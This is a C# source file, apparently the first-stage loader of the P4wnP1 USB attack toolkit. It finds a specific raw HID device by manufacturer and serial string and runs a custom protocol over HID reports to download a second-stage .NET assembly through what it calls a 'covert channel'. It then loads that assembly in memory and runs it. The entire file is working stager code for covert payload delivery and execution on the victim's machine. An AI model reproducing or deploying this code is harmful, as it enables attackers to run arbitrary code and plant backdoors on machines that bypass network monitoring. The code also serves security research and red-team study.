using System;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Collections.Generic;
using System.Reflection;

namespace Stage1
{
    public class Device
    {

        /* invalid handle value */
        public static IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        // kernel32.dll
        public const uint GENERIC_READ = 0x80000000;
        public const uint GENERIC_WRITE = 0x40000000;
        public const uint FILE_SHARE_WRITE = 0x2;
        public const uint FILE_SHARE_READ = 0x1;
        public const uint FILE_FLAG_OVERLAPPED = 0x40000000;
        public const uint OPEN_EXISTING = 3;
        public const uint OPEN_ALWAYS = 4;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPStr)] string strName, uint nAccess, uint nShareMode, IntPtr lpSecurity, uint nCreationFlags, uint nAttributes, IntPtr lpTemplate);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("hid.dll", SetLastError = true)]
        public static extern void HidD_GetHidGuid(out Guid gHid);

        [DllImport("hid.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern Boolean HidD_GetManufacturerString(IntPtr hFile, StringBuilder buffer, Int32 bufferLength);

        [DllImport("hid.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool HidD_GetSerialNumberString(IntPtr hDevice, StringBuilder buffer, Int32 bufferLength);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern bool HidD_GetPreparsedData(IntPtr hFile, out IntPtr lpData);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern int HidP_GetCaps(IntPtr lpData, out HidCaps oCaps);

        [DllImport("hid.dll", SetLastError = true)]
        protected static extern bool HidD_FreePreparsedData(ref IntPtr pData);

        // setupapi.dll

        public const int DIGCF_PRESENT = 0x02;
        public const int DIGCF_DEVICEINTERFACE = 0x10;

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct DeviceInterfaceData
        {
            public int Size;
            public Guid InterfaceClassGuid;
            public int Flags;
            public IntPtr Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct DeviceInterfaceDetailData
        {
            public int Size;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 512)]
            public string DevicePath;
        }

        //We need to create a _HID_CAPS structure to retrieve HID report information
        //Details: https://msdn.microsoft.com/en-us/library/windows/hardware/ff539697(v=vs.85).aspx
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        protected struct HidCaps
        {
            public short Usage;
            public short UsagePage;
            public short InputReportByteLength;
            public short OutputReportByteLength;
            public short FeatureReportByteLength;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x11)]
            public short[] Reserved;
            public short NumberLinkCollectionNodes;
            public short NumberInputButtonCaps;
            public short NumberInputValueCaps;
            public short NumberInputDataIndices;
            public short NumberOutputButtonCaps;
            public short NumberOutputValueCaps;
            public short NumberOutputDataIndices;
            public short NumberFeatureButtonCaps;
            public short NumberFeatureValueCaps;
            public short NumberFeatureDataIndices;
        }


        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern IntPtr SetupDiGetClassDevs(ref Guid gClass, [MarshalAs(UnmanagedType.LPStr)] string strEnumerator, IntPtr hParent, uint nFlags);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiEnumDeviceInterfaces(IntPtr lpDeviceInfoSet, uint nDeviceInfoData, ref Guid gClass, uint nIndex, ref DeviceInterfaceData oInterfaceData);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr lpDeviceInfoSet, ref DeviceInterfaceData oInterfaceData, ref DeviceInterfaceDetailData oDetailData, uint nDeviceInterfaceDetailDataSize, ref uint nRequiredSize, IntPtr lpDeviceInfoData);

        [DllImport("setupapi.dll", SetLastError = true)]
        public static extern bool SetupDiDestroyDeviceInfoList(IntPtr lpInfoSet);

        //public static FileStream Open(string tSerial, string tMan)
        public static FileStream Open(string tSerial, string tMan)
        {
            FileStream devFile = null;

            Guid gHid;
            HidD_GetHidGuid(out gHid);

            // create list of HID devices present right now
            var hInfoSet = SetupDiGetClassDevs(ref gHid, null, IntPtr.Zero, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);

            var iface = new DeviceInterfaceData(); // allocate mem for interface descriptor
            iface.Size = Marshal.SizeOf(iface); // set size field
            uint index = 0; // interface index 

            // Enumerate all interfaces with HID GUID
            while (SetupDiEnumDeviceInterfaces(hInfoSet, 0, ref gHid, index, ref iface))
            {
                var detIface = new DeviceInterfaceDetailData(); // detailed interface information
                uint reqSize = (uint)Marshal.SizeOf(detIface); // required size
                detIface.Size = Marshal.SizeOf(typeof(IntPtr)) == 8 ? 8 : 5; // Size depends on arch (32 / 64 bit), distinguish by IntPtr size

                // get device path
                SetupDiGetDeviceInterfaceDetail(hInfoSet, ref iface, ref detIface, reqSize, ref reqSize, IntPtr.Zero);
                var path = detIface.DevicePath;

//                System.Console.WriteLine("Path: {0}", path);

                // Open filehandle to device
                var handle = CreateFile(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, IntPtr.Zero);
                
                if (handle == INVALID_HANDLE_VALUE)
                {
                    //System.Console.WriteLine("Invalid handle");
                    index++;
                    continue;
                }

                IntPtr lpData;
                if (HidD_GetPreparsedData(handle, out lpData))
                {
                    HidCaps oCaps;
                    HidP_GetCaps(lpData, out oCaps);    // extract the device capabilities from the internal buffer
                    int inp = oCaps.InputReportByteLength;    // get the input...
                    int outp = oCaps.OutputReportByteLength;    // ... and output report length
                    HidD_FreePreparsedData(ref lpData);
//                    System.Console.WriteLine("Input: {0}, Output: {1}", inp, outp);

                    // we have report length matching our input / output report, so we create a device file in each case
                    if (inp == 65 || outp == 65)
                    {
                        // check if manufacturer and serial string are matching

                        //Manufacturer
                        var s = new StringBuilder(256); // returned string
                        string man = String.Empty; // get string
                        if (HidD_GetManufacturerString(handle, s, s.Capacity)) man = s.ToString();

                        //Serial
                        string serial = String.Empty; // get string
                        if (HidD_GetSerialNumberString(handle, s, s.Capacity)) serial = s.ToString();

                        if (tMan.Equals(man, StringComparison.Ordinal) && tSerial.Equals(serial, StringComparison.Ordinal))
                        {
                            //Console.WriteLine("Device found: " + path);

                            var shandle = new SafeFileHandle(handle, false);

                            devFile = new FileStream(shandle, FileAccess.Read | FileAccess.Write, 32, true);


                            break;
                        }


                    }

                }
                index++;
            }
            SetupDiDestroyDeviceInfoList(hInfoSet);
            return devFile;
        }

        public static byte[] DownloadStage2(FileStream HIDin, FileStream HIDout)
        {
            byte[] request = new byte[65];
            byte[] response = new byte[65];
            bool connected = false;
            byte SEQ = 0;
            byte ACK;
            bool CONNECT_BIT;
            

            request[2] = (byte) (request[2] | 128); // set CONNECT BIT (LinkLayer)
            //Console.WriteLine("Stage1: Starting connection synchronization..");

            while (!connected) // till connected
            {
                /*
                 * send packet with ACK, this should be used by the peer to chooese starting SEQ
                 * the CONNECT BIT tells the peer to flush its outbound queue
                 * this did ONLY happen, if we receive a report with CONNECT BIT SET (holding the initial sequence number)
                 */

                HIDout.Write(request, 0, request.Length); // This repoert holds has ACK=0 which should be ignored by the server

                //Console.WriteLine("Stage1: Connect request sent");

                HIDin.Read(response, 0, response.Length); // read back response

                SEQ = (byte) (response[2] & 63); //extract received SEQ number
                CONNECT_BIT = (response[2] & 128) > 0; //extract CONNECT bit as bool

                /*
                 *  we repeat the alternating read write from above, until the pee recognized our connect bit
                 *  which means we receive the first valid SEQ in the inbound report with CONNECT BIT set
                 */

                if (CONNECT_BIT)
                {
//                    Console.WriteLine(String.Format("Satge1: Synced to SEQ number {0}", SEQ));
                    // this is the initial SEQ number, send corresponding ACK and exit loop
                    request[2] = (byte) (request[2] | SEQ); // set ACK field according to received SEQ
                    HIDout.Write(request, 0, request.Length);
                    break;
                }
                //else
                //{
                //    Console.WriteLine(String.Format("SEQ {0} received on connection request, but no connect response", SEQ));
                //}  
            }

            /*
             * we are in sync now and continue with STOP-AND-WAIT (alternating read write) the first report we write out is
             * a request for stage two which is represented by a payload with an int32=1
             */

            int cr = HIDin.Read(response, 0, response.Length);
            ACK = SEQ;

            /*
             * we construct a packet representing a stage2 request like this
             *      0:     Report ID (unused)
             *      1:     Payload length (Bit 0..5) + FIN BIT (Bit 7)
             *      2:     ACK number
             *      3..62: Payload (padded with zeroes), details below
             *          3..6:     32 bit channel number, 0x00000000 in this case, as this is the control channel
             *          7..10:    32 bit control message type, 0x00000001 in this case (represents a stage 2 request)
             */

            //byte[] stage2request = new byte[65];
            Array.Clear(request, 0, 65);
            byte[] channel_id = BitConverter.GetBytes((UInt32)0);
            byte[] TYPE_CTRL_MSG = BitConverter.GetBytes((UInt32)1);
            
            // account for endianess (Convert to network order)
            if (System.BitConverter.IsLittleEndian)
            {
                //Array.Reverse(channel_id); // not needed as this is zero
                Array.Reverse(TYPE_CTRL_MSG);
            }

            byte payload_length = 8; //uint32 channel_id + uint32 message_type

            //stage2request[0] = 0; //USB HID report ID, not used
            request[1] = (byte) (payload_length | (1 << 7)); //payload length + FIN bit
            request[2] = ACK; // ACK for last received SEQ
            Array.Copy(channel_id, 0, request, 3, channel_id.Length); // set channel ID
            Array.Copy(TYPE_CTRL_MSG, 0, request, 7, TYPE_CTRL_MSG.Length); // set MSG TYPE for control channel

            //send request
            HIDout.Write(request, 0, request.Length);

            /*
             * The P4wnP1 server endpoint should be aware of our stage1 request, we continue with STOP-AND-WAIT till we receive the first stage1
             * report. Reassembling has to be done manually, as we don't have full duplex LinkLayer running. (In theory we would have to account
             * for lost packets and request resends in case this happens. Anyway, we rely on the peer to never send to many packets, so we should never
             * miss something).
             */


            List<byte> stage2 = new List<byte>();
            List<byte> tmpData = new List<byte>();
            bool FIN = false;
            while (true)
            {
                HIDin.Read(response, 0, response.Length);
                payload_length = (byte)(response[1] & 63); //extract LEN field
                FIN = (response[1] & 128) > 0; //extract FIN BIT
                SEQ = (byte)(response[2] & 63); //extract SEQ field
                
                if (payload_length > 0)
                {
                    Array.Copy(response, 3, channel_id, 0, 4); //extract channel id
                    Array.Copy(response, 7, TYPE_CTRL_MSG, 0, 4); //extract message type (assuming that channel ID is 0, meaning control channel)
                    if (BitConverter.IsLittleEndian)
                    {
                        Array.Reverse(channel_id);
                        Array.Reverse(TYPE_CTRL_MSG);
                    }
                    UInt32 ch_id = BitConverter.ToUInt32(channel_id, 0);
                    UInt32 msg_type = BitConverter.ToUInt32(TYPE_CTRL_MSG, 0);

                    // check if this is the initial HID report containing stage2 data
                    if (stage2.Count == 0)
                    {
                        //check if this is payload is containing a part of stage2 and thus is the initial report of stage2 data
                        if ((ch_id == 0) && (msg_type == 1000))
                        {
                            //pack data, omitting header bytes
                            tmpData.AddRange(response);
                            stage2.AddRange(tmpData.GetRange(11, payload_length-8)); //omit 3 link layer header bytes (0 = ID, 1 = LEN/FIN, 2 = SEQ), additional 8 bytes stream header (3..6 = CHANNEL_ID, 7..10 = MSG_TYPE)           
                            tmpData.Clear();
                        }
                        //else Console.WriteLine("Error on receiving stage 2, wrong type in first report. Skipping this stream...");
                    }
                    else
                    {
                        //not first report, append data (no CHANNEL_ID and MSG_TYPE contained, so payload starts from byte number 3)
                        tmpData.AddRange(response);
                        stage2.AddRange(tmpData.GetRange(3, payload_length));
                        tmpData.Clear();
                    }

                    //if FIN bBIt is set, this was the last report containing stage2 data (of course the first report should have been received before ending this loop)
                    if (FIN && (stage2.Count > 0)) break; // end loop
                }

                ACK = SEQ;
                Array.Clear(request, 0, 65); // clear array
                request[2] = ACK;
                HIDout.Write(request, 0, request.Length);
            }

            /*
             * send response with MSG_STAGE2_RECEIVED to inform sender that stage2 has been received (valid ACK)
             */
            channel_id = BitConverter.GetBytes((UInt32)0);
            TYPE_CTRL_MSG = BitConverter.GetBytes((UInt32)2); //MSG_STAGE2_RECEIVED
            if (System.BitConverter.IsLittleEndian) Array.Reverse(TYPE_CTRL_MSG);
            payload_length = 8; //uint32 channel_id + uint32 message_type
            request[1] = (byte)(payload_length | (1 << 7)); //payload length + FIN bit
            request[2] = ACK; // ACK for last received SEQ
            Array.Copy(channel_id, 0, request, 3, channel_id.Length); // set channel ID
            Array.Copy(TYPE_CTRL_MSG, 0, request, 3, TYPE_CTRL_MSG.Length); // set MSG TYPE for control channel
            HIDout.Write(request, 0, request.Length);


            return stage2.ToArray();
        }

        public static void runStage2(byte[] stage2, FileStream HIDin, FileStream HIDout)
        {
            Assembly stage2assembly =  Assembly.Load(stage2);
            Type typeRunner = stage2assembly.GetType("P4wnP1.Runner");
            MethodInfo method = typeRunner.GetMethod("run", BindingFlags.Public | BindingFlags.Static);
            method.Invoke(null, new Object[] { HIDin, HIDout });
        }

        public static void Stage2DownExec(string tSerial, string tMan)
        {
            System.IO.FileStream dev = Open(tSerial, tMan); // open filestream to raw HID device (based on SERIAL + MANUFACTURER string)
            byte[] stage2 = Device.DownloadStage2(dev, dev); // request stage2 assembly via HID covert channel
            runStage2(stage2, dev, dev); //invoke stage2
        }
    }

}
